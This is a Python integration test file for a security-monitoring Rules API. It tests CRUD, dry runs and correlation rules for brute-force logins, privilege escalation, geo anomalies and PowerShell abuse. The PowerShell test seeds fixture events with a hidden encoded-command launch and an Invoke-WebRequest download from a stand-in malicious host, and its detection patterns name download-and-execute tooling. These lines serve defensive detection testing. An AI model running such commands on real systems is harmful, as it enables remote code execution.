"""Integration tests for Rules API (/api/v1/rules)."""
from __future__ import annotations

from datetime import datetime, timezone

import pytest
from httpx import AsyncClient

from app.domain.models import Event, Source


pytestmark = pytest.mark.asyncio

_VALID_RULE = {
    "name": "High error rate",
    "description": "Fires when errors spike",
    "condition": {"severity": "error"},
    "threshold": 10,
    "window_seconds": 300,
    "severity": "warning",
    "enabled": True,
}


class TestRulesCRUD:
    async def test_list_rules_empty(self, client: AsyncClient):
        resp = await client.get("/api/v1/rules")
        assert resp.status_code == 200
        assert resp.json()["items"] == []

    async def test_create_rule(self, client: AsyncClient):
        resp = await client.post("/api/v1/rules", json=_VALID_RULE)
        assert resp.status_code == 201
        body = resp.json()
        assert body["name"] == "High error rate"
        assert body["threshold"] == 10
        assert body["window_seconds"] == 300
        assert "id" in body

    async def test_create_sequence_rule(self, client: AsyncClient):
        payload = {
            "name": "Auth failure followed by success",
            "description": "Sequence rule",
            "condition": {},
            "sequence": [
                {"field": "event_action", "value": "failed_password"},
                {"field": "event_action", "value": "login_success"},
            ],
            "group_by_entity": "username",
            "threshold": 1,
            "window_seconds": 300,
            "severity": "warning",
            "enabled": True,
        }
        resp = await client.post("/api/v1/rules", json=payload)
        assert resp.status_code == 201
        body = resp.json()
        assert body["sequence"] == payload["sequence"]
        assert body["group_by_entity"] == "username"

    async def test_create_rule_with_mitre_metadata(self, client: AsyncClient):
        payload = {
            **_VALID_RULE,
            "name": "Suspicious PowerShell MITRE",
            "mitre_techniques": ["T1059.001", "T1105"],
            "mitre_tactic": "execution",
        }
        resp = await client.post("/api/v1/rules", json=payload)
        assert resp.status_code == 201
        body = resp.json()
        assert body["mitre_techniques"] == ["T1059.001", "T1105"]
        assert body["mitre_tactic"] == "execution"

    async def test_list_rules_after_create(self, client: AsyncClient):
        await client.post("/api/v1/rules", json=_VALID_RULE)
        resp = await client.get("/api/v1/rules")
        assert len(resp.json()["items"]) == 1

    async def test_patch_rule_threshold(self, client: AsyncClient):
        create = await client.post("/api/v1/rules", json=_VALID_RULE)
        rule_id = create.json()["id"]

        resp = await client.patch(f"/api/v1/rules/{rule_id}", json={"threshold": 5})
        assert resp.status_code == 200
        assert resp.json()["threshold"] == 5

    async def test_patch_rule_enabled(self, client: AsyncClient):
        create = await client.post("/api/v1/rules", json=_VALID_RULE)
        rule_id = create.json()["id"]

        resp = await client.patch(f"/api/v1/rules/{rule_id}", json={"enabled": False})
        assert resp.status_code == 200
        assert resp.json()["enabled"] is False

    async def test_patch_rule_mitre_metadata(self, client: AsyncClient):
        create = await client.post("/api/v1/rules", json=_VALID_RULE)
        rule_id = create.json()["id"]

        resp = await client.patch(
            f"/api/v1/rules/{rule_id}",
            json={"mitre_techniques": ["T1110"], "mitre_tactic": "credential-access"},
        )
        assert resp.status_code == 200
        assert resp.json()["mitre_techniques"] == ["T1110"]
        assert resp.json()["mitre_tactic"] == "credential-access"

    async def test_patch_nonexistent_returns_404(self, client: AsyncClient):
        resp = await client.patch(
            "/api/v1/rules/00000000-0000-0000-0000-000000000000",
            json={"threshold": 1}
        )
        assert resp.status_code == 404

    async def test_delete_rule(self, client: AsyncClient):
        create = await client.post("/api/v1/rules", json=_VALID_RULE)
        rule_id = create.json()["id"]

        resp = await client.delete(f"/api/v1/rules/{rule_id}")
        assert resp.status_code == 204

        list_resp = await client.get("/api/v1/rules")
        assert list_resp.status_code == 200
        items = list_resp.json()["items"]
        assert not any(rule["id"] == rule_id for rule in items)

    async def test_delete_nonexistent_returns_404(self, client: AsyncClient):
        resp = await client.delete("/api/v1/rules/00000000-0000-0000-0000-000000000000")
        assert resp.status_code == 404

    async def test_create_rule_missing_required_fields(self, client: AsyncClient):
        resp = await client.post("/api/v1/rules", json={"name": "incomplete"})
        assert resp.status_code == 422

    async def test_dry_run_no_events(self, client: AsyncClient):
        create = await client.post("/api/v1/rules", json=_VALID_RULE)
        rule_id = create.json()["id"]

        resp = await client.post(f"/api/v1/rules/{rule_id}/dry-run", json={})
        assert resp.status_code == 200
        body = resp.json()
        assert "matched_events" in body
        assert "would_create_incident" in body
        assert body["matched_events"] == 0
        assert body["would_create_incident"] is False

    async def test_dry_run_matches_fields_json_condition(self, client: AsyncClient, db_session):
        source = Source(
            name="auth-log",
            type="file",
            enabled=True,
            config_json={"path": "/var/log/auth.log"},
        )
        db_session.add(source)
        await db_session.flush()

        db_session.add(
            Event(
                source_id=source.id,
                timestamp=datetime.now(timezone.utc),
                severity="warning",
                message="Failed password for root from 10.0.0.5 port 22 ssh2",
                service="sshd",
                host="srv-auth-01",
                environment="test",
                event_type="auth",
                fields_json={"username": "root", "source_ip": "10.0.0.5", "event_action": "failed_password"},
                fingerprint="auth-failed-root-1",
            )
        )
        await db_session.commit()

        create = await client.post(
            "/api/v1/rules",
            json={
                "name": "SSH Failed Password Burst",
                "description": "Correlates failed password attempts for the same user",
                "condition": {"service": "sshd", "field": "event_action", "value": "failed_password"},
                "threshold": 1,
                "window_seconds": 300,
                "severity": "warning",
                "enabled": True,
            },
        )
        rule_id = create.json()["id"]

        resp = await client.post(f"/api/v1/rules/{rule_id}/dry-run", json={})
        assert resp.status_code == 200
        assert resp.json()["matched_events"] == 1
        assert resp.json()["would_create_incident"] is True

    async def test_dry_run_matches_deployment_condition(self, client: AsyncClient, db_session):
        source = Source(
            name="deploy-log",
            type="file",
            enabled=True,
            config_json={"path": "/var/log/deploy.log"},
        )
        db_session.add(source)
        await db_session.flush()

        db_session.add(
            Event(
                source_id=source.id,
                timestamp=datetime.now(timezone.utc),
                severity="info",
                message="Deployment finished for release 2026.05.06-1",
                service="deploy-agent",
                host="srv-app-01",
                environment="production",
                event_type="deployment",
                fields_json={"release": "2026.05.06-1", "deployment_status": "completed"},
                fingerprint="deploy-prod-20260506-1",
            )
        )
        await db_session.commit()

        create = await client.post(
            "/api/v1/rules",
            json={
                "name": "Production Deployment Seen",
                "description": "Matches deployment events in production",
                "condition": {"event_type": "deployment", "environment": "production"},
                "threshold": 1,
                "window_seconds": 300,
                "severity": "info",
                "enabled": True,
            },
        )
        rule_id = create.json()["id"]

        resp = await client.post(f"/api/v1/rules/{rule_id}/dry-run", json={})
        assert resp.status_code == 200
        assert resp.json()["matched_events"] == 1
        assert resp.json()["would_create_incident"] is True

    async def test_dry_run_matches_sequence_rule(self, client: AsyncClient, db_session):
        source = Source(
            name="sequence-log",
            type="file",
            enabled=True,
            config_json={"path": "/var/log/sequence.log"},
        )
        db_session.add(source)
        await db_session.flush()

        db_session.add_all([
            Event(
                source_id=source.id,
                timestamp=datetime.now(timezone.utc),
                severity="warning",
                message="failed login",
                service="sshd",
                host="srv-auth-01",
                environment="test",
                event_type="auth",
                fields_json={"username": "alice", "event_action": "failed_password"},
                fingerprint="auth-seq-1",
            ),
            Event(
                source_id=source.id,
                timestamp=datetime.now(timezone.utc),
                severity="info",
                message="successful login",
                service="sshd",
                host="srv-auth-01",
                environment="test",
                event_type="auth",
                fields_json={"username": "alice", "event_action": "login_success"},
                fingerprint="auth-seq-2",
            ),
        ])
        await db_session.commit()

        create = await client.post(
            "/api/v1/rules",
            json={
                "name": "Auth failure then success",
                "description": "Sequence match",
                "condition": {},
                "sequence": [
                    {"field": "event_action", "value": "failed_password"},
                    {"field": "event_action", "value": "login_success"},
                ],
                "group_by_entity": "username",
                "threshold": 1,
                "window_seconds": 300,
                "severity": "warning",
                "enabled": True,
            },
        )
        rule_id = create.json()["id"]

        resp = await client.post(f"/api/v1/rules/{rule_id}/dry-run", json={})
        assert resp.status_code == 200
        assert resp.json()["matched_events"] == 1
        assert resp.json()["would_create_incident"] is True

    async def test_dry_run_matches_multiple_failed_logins_sequence(self, client: AsyncClient, db_session):
        source = Source(
            name="auth-correlation-log",
            type="file",
            enabled=True,
            config_json={"path": "/var/log/auth-correlation.log"},
        )
        db_session.add(source)
        await db_session.flush()

        for index in range(3):
            db_session.add(
                Event(
                    source_id=source.id,
                    timestamp=datetime.now(timezone.utc),
                    severity="warning",
                    message=f"failed login {index}",
                    service="sshd",
                    host="srv-auth-02",
                    environment="test",
                    event_type="auth",
                    fields_json={
                        "username": "root",
                        "source_ip": "203.0.113.50",
                        "event_action": "failed_password",
                    },
                    fingerprint=f"failed-seq-{index}",
                )
            )
        await db_session.commit()

        create = await client.post(
            "/api/v1/rules",
            json={
                "name": "Multiple Failed Logins Test",
                "description": "Correlates repeated auth failures",
                "condition": {},
                "sequence": [
                    {"field": "event_action", "value": "failed_password"},
                    {"field": "event_action", "value": "failed_password"},
                    {"field": "event_action", "value": "failed_password"},
                ],
                "group_by_entity": "username,source_ip",
                "threshold": 1,
                "window_seconds": 300,
                "severity": "warning",
                "enabled": True,
            },
        )
        rule_id = create.json()["id"]

        resp = await client.post(f"/api/v1/rules/{rule_id}/dry-run", json={})
        assert resp.status_code == 200
        assert resp.json()["matched_events"] == 1
        assert resp.json()["would_create_incident"] is True

    async def test_dry_run_matches_privilege_escalation_sequence(self, client: AsyncClient, db_session):
        source = Source(
            name="priv-esc-log",
            type="file",
            enabled=True,
            config_json={"path": "/var/log/priv-esc.log"},
        )
        db_session.add(source)
        await db_session.flush()

        db_session.add_all([
            Event(
                source_id=source.id,
                timestamp=datetime.now(timezone.utc),
                severity="info",
                message="login success",
                service="sshd",
                host="srv-admin-01",
                environment="test",
                event_type="auth",
                fields_json={"username": "alice", "event_action": "login_success"},
                fingerprint="priv-seq-1",
            ),
            Event(
                source_id=source.id,
                timestamp=datetime.now(timezone.utc),
                severity="warning",
                message="user added to sudoers",
                service="sudo",
                host="srv-admin-01",
                environment="test",
                event_type="privilege",
                fields_json={"username": "alice", "event_action": "privilege_change"},
                fingerprint="priv-seq-2",
            ),
            Event(
                source_id=source.id,
                timestamp=datetime.now(timezone.utc),
                severity="warning",
                message="sudo command executed",
                service="sudo",
                host="srv-admin-01",
                environment="test",
                event_type="command",
                fields_json={"username": "alice", "event_action": "sudo_command"},
                fingerprint="priv-seq-3",
            ),
        ])
        await db_session.commit()

        create = await client.post(
            "/api/v1/rules",
            json={
                "name": "Privilege Escalation Sequence Test",
                "description": "Correlates auth success to privileged action",
                "condition": {},
                "sequence": [
                    {"field": "event_action", "value_in": ["login_success", "auth_success"]},
                    {"field": "event_action", "value_in": ["privilege_change", "sudo_start", "admin_group_add"]},
                    {"field": "event_action", "value_in": ["sensitive_command", "sudo_command", "credential_dump_attempt"]},
                ],
                "group_by_entity": "username,host",
                "threshold": 1,
                "window_seconds": 600,
                "severity": "high",
                "enabled": True,
            },
        )
        rule_id = create.json()["id"]

        resp = await client.post(f"/api/v1/rules/{rule_id}/dry-run", json={})
        assert resp.status_code == 200
        assert resp.json()["matched_events"] == 1
        assert resp.json()["would_create_incident"] is True

    async def test_dry_run_matches_geo_anomaly(self, client: AsyncClient, db_session):
        source = Source(
            name="geo-anomaly-log",
            type="file",
            enabled=True,
            config_json={"path": "/var/log/geo-anomaly.log"},
        )
        db_session.add(source)
        await db_session.flush()

        db_session.add_all([
            Event(
                source_id=source.id,
                timestamp=datetime.now(timezone.utc),
                severity="info",
                message="login success baseline 1",
                service="sshd",
                host="srv-auth-01",
                environment="test",
                event_type="auth",
                fields_json={"username": "alice", "country": "DE", "asn": "AS3320", "event_action": "login_success"},
                fingerprint="geo-seq-1",
            ),
            Event(
                source_id=source.id,
                timestamp=datetime.now(timezone.utc),
                severity="info",
                message="login success baseline 2",
                service="sshd",
                host="srv-auth-01",
                environment="test",
                event_type="auth",
                fields_json={"username": "alice", "country": "DE", "asn": "AS3320", "event_action": "login_success"},
                fingerprint="geo-seq-2",
            ),
            Event(
                source_id=source.id,
                timestamp=datetime.now(timezone.utc),
                severity="info",
                message="login success baseline 3",
                service="sshd",
                host="srv-auth-01",
                environment="test",
                event_type="auth",
                fields_json={"username": "alice", "country": "DE", "asn": "AS3320", "event_action": "login_success"},
                fingerprint="geo-seq-3",
            ),
            Event(
                source_id=source.id,
                timestamp=datetime.now(timezone.utc),
                severity="warning",
                message="login success unseen location",
                service="sshd",
                host="srv-auth-01",
                environment="test",
                event_type="auth",
                fields_json={"username": "alice", "country": "US", "asn": "AS15169", "event_action": "login_success"},
                fingerprint="geo-seq-4",
            ),
        ])
        await db_session.commit()

        create = await client.post(
            "/api/v1/rules",
            json={
                "name": "Geo Anomaly Test",
                "description": "Detect unseen location per user",
                "condition": {
                    "type": "geo_anomaly",
                    "entity_field": "username",
                    "location_fields": ["country", "asn"],
                    "min_history_events": 3,
                    "baseline_exclude_recent": 1,
                },
                "threshold": 1,
                "window_seconds": 3600,
                "severity": "high",
                "enabled": True,
            },
        )
        rule_id = create.json()["id"]

        resp = await client.post(f"/api/v1/rules/{rule_id}/dry-run", json={})
        assert resp.status_code == 200
        assert resp.json()["matched_events"] == 1
        assert resp.json()["would_create_incident"] is True

    async def test_dry_run_geo_anomaly_needs_baseline(self, client: AsyncClient, db_session):
        source = Source(
            name="geo-anomaly-small-log",
            type="file",
            enabled=True,
            config_json={"path": "/var/log/geo-anomaly-small.log"},
        )
        db_session.add(source)
        await db_session.flush()

        db_session.add_all([
            Event(
                source_id=source.id,
                timestamp=datetime.now(timezone.utc),
                severity="info",
                message="login success baseline",
                service="sshd",
                host="srv-auth-01",
                environment="test",
                event_type="auth",
                fields_json={"username": "alice", "country": "DE", "asn": "AS3320", "event_action": "login_success"},
                fingerprint="geo-small-1",
            ),
            Event(
                source_id=source.id,
                timestamp=datetime.now(timezone.utc),
                severity="warning",
                message="login success new country",
                service="sshd",
                host="srv-auth-01",
                environment="test",
                event_type="auth",
                fields_json={"username": "alice", "country": "US", "asn": "AS15169", "event_action": "login_success"},
                fingerprint="geo-small-2",
            ),
        ])
        await db_session.commit()

        create = await client.post(
            "/api/v1/rules",
            json={
                "name": "Geo Anomaly Baseline Test",
                "description": "No alert without baseline",
                "condition": {
                    "type": "geo_anomaly",
                    "entity_field": "username",
                    "location_fields": ["country", "asn"],
                    "min_history_events": 3,
                    "baseline_exclude_recent": 1,
                },
                "threshold": 1,
                "window_seconds": 3600,
                "severity": "high",
                "enabled": True,
            },
        )
        rule_id = create.json()["id"]

        resp = await client.post(f"/api/v1/rules/{rule_id}/dry-run", json={})
        assert resp.status_code == 200
        assert resp.json()["matched_events"] == 0
        assert resp.json()["would_create_incident"] is False

    async def test_dry_run_matches_suspicious_powershell_chain(self, client: AsyncClient, db_session):
        source = Source(
            name="powershell-chain-log",
            type="file",
            enabled=True,
            config_json={"path": "/var/log/powershell-chain.log"},
        )
        db_session.add(source)
        await db_session.flush()

        db_session.add_all([
            Event(
                source_id=source.id,
                timestamp=datetime.now(timezone.utc),
                severity="warning",
                message="powershell.exe -windowstyle hidden -encodedcommand AAAA",
                service="powershell",
                host="workstation-17",
                environment="test",
                event_type="process",
                fields_json={"username": "alice", "event_action": "process_start"},
                fingerprint="ps-chain-1",
            ),
            Event(
                source_id=source.id,
                timestamp=datetime.now(timezone.utc),
                severity="warning",
                message="powershell Invoke-WebRequest http://malicious.example/payload.ps1",
                service="powershell",
                host="workstation-17",
                environment="test",
                event_type="network",
                fields_json={"username": "alice", "event_action": "network_execution"},
                fingerprint="ps-chain-2",
            ),
        ])
        await db_session.commit()

        create = await client.post(
            "/api/v1/rules",
            json={
                "name": "Suspicious PowerShell Chain Test",
                "description": "Correlates encoded command and follow-up execution",
                "condition": {},
                "sequence": [
                    {"message_contains_any": ["-encodedcommand", "-windowstyle hidden", "powershell -enc"]},
                    {"message_contains_any": ["invoke-webrequest", "downloadstring(", "mshta"]},
                ],
                "group_by_entity": "host",
                "threshold": 1,
                "window_seconds": 900,
                "severity": "high",
                "enabled": True,
            },
        )
        rule_id = create.json()["id"]

        resp = await client.post(f"/api/v1/rules/{rule_id}/dry-run", json={})
        assert resp.status_code == 200
        assert resp.json()["matched_events"] == 1
        assert resp.json()["would_create_incident"] is True
